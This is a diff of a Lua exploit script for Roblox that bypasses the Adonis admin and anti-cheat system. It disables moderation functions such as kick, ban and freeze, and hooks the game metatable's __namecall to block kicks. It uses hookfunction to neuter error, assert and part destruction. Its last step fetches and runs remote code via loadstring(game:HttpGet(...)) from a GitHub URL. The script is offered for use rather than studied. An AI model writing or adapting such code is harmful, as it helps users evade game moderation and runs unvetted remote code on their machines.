@@ -1,43 +1,35 @@
--- 🚀 Advanced Stealth Adonis Bypass (Require-Hook + Remote Filter)
+-- Ultra-Protected Advanced Stealth Adonis Bypass (Autoexec)
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- Extended list of known dangerous Adonis commands (case-insensitive)
-local bad = {
-    "crash", "cpucrash", "gpucrash", "shutdown", "softshutdown",
-    "kick", "softkick", "seize", "blockinput", "break", "lock",
-    "setcore", "serverkick", "servershutdown", "ban", "mute",
-    "freeze", "teleportkill", "forcereset", "crashclient",
-    "crashserver", "memoryleak", "blackscreen", "kickall",
-    "log", "copy", "reset", "clear", "disconnect", "delete",
-    "nil", "control", "view", "explorer", "deletecharacter",
-    "notadmin", "removetools", "spinhax", "corrupt", "blind",
-    "sit", "remove", "tools", "void", "teleport", "shutdownclient",
-    "teleportplayer", "controlplayer", "logoutput", "console",
-    "error", "warn", "systemmessage", "disablecontrols",
-    "crashgui", "crashgame", "taskcrash", "freezeclient",
-    "performancekill", "debughook", "hookbreak", "destroy",
-    "clearworkspace", "blockchat", "kill"
+-- List of harmful function names inside Adonis modules (all lowercase)
+local badFunctions = {
+    "crash","cpucrash","gpucrash","shutdown","softshutdown",
+    "kick","softkick","seize","blockinput","break","lock",
+    "setcore","serverkick","servershutdown","ban","mute",
+    "freeze","teleportkill","forcereset","crashclient",
+    "crashserver","memoryleak","blackscreen","kickall",
+    "crashclient","crashserver"
 }
 
--- Check if a string matches a bad command (case-insensitive)
-local function isBad(cmd)
-    if type(cmd) ~= "string" then return false end
-    cmd = cmd:lower()
-    for i = 1, #bad do
-        if cmd == bad[i] then return true end
+local function tableFind(tbl, val)
+    val = val:lower()
+    for i = 1, #tbl do
+        if tbl[i] == val then return true end
     end
     return false
 end
 
--- Neutralize a module table in place
 local function neutralizeModule(modTable)
     if type(modTable) ~= "table" then return end
     for name, fn in pairs(modTable) do
-        if isBad(name) and type(fn) == "function" then
-            modTable[name] = function(...) return nil end
+        if type(name) == "string" and tableFind(badFunctions, name:lower()) and type(fn) == "function" then
+            modTable[name] = function(...) 
+                warn("[Bypass] Blocked Adonis:", name) 
+                return nil 
+            end
         end
     end
 end
@@ -84,9 +76,82 @@ end
 for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
     if obj:IsA("RemoteEvent") and obj.Name:lower():find("client") then
         obj.OnClientEvent:Connect(function(cmd, ...)
-            if isBad(cmd) then
+            if type(cmd) == "string" and tableFind(badFunctions, cmd:lower()) then
+                warn("[Bypass] Blocked Adonis Remote Command:", cmd)
                 return
             end
         end)
     end
 end
+
+-- 4) Override Kick method via metatable hook to block kicking
+pcall(function()
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    local oldNamecall = mt.__namecall
+    mt.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if tostring(self) == "LocalPlayer" and method == "Kick" then
+            warn("[Bypass] Blocked LocalPlayer:Kick()")
+            return nil
+        end
+        return oldNamecall(self, ...)
+    end)
+    setreadonly(mt, true)
+end)
+
+-- 5) Override core Lua functions that might crash the client
+pcall(function()
+    if hookfunction then
+        hookfunction(error, function(...) return nil end)
+        hookfunction(assert, function(...) return (...) end)
+    end
+end)
+
+-- 6) Prevent character parts destruction
+local function protectCharParts()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    for _, part in ipairs(char:GetDescendants()) do
+        if typeof(part.Destroy) == "function" then
+            if hookfunction then
+                pcall(function()
+                    hookfunction(part.Destroy, function() return end)
+                end)
+            else
+                part.Destroy = function() end
+            end
+        end
+        if typeof(part.Remove) == "function" then
+            if hookfunction then
+                pcall(function()
+                    hookfunction(part.Remove, function() return end)
+                end)
+            else
+                part.Remove = function() end
+            end
+        end
+    end
+end
+task.spawn(protectCharParts)
+
+-- 7) Patch global tables for crash commands if any
+task.spawn(function()
+    for i, v in pairs(_G) do
+        if type(v) == "table" then
+            for k, func in pairs(v) do
+                if typeof(k) == "string" and tableFind(badFunctions, k:lower()) and type(func) == "function" then
+                    v[k] = function() return nil end
+                end
+            end
+        end
+    end
+end)
+
+-- 8) Early load Adonis script ASAP (optional)
+pcall(function()
+    task.spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/iamcheese-man/source/refs/heads/main/AdonisScript", true))()
+    end)
+end)
+
+print("[Bypass] Ultra-Protected Advanced Adonis Bypass loaded.")
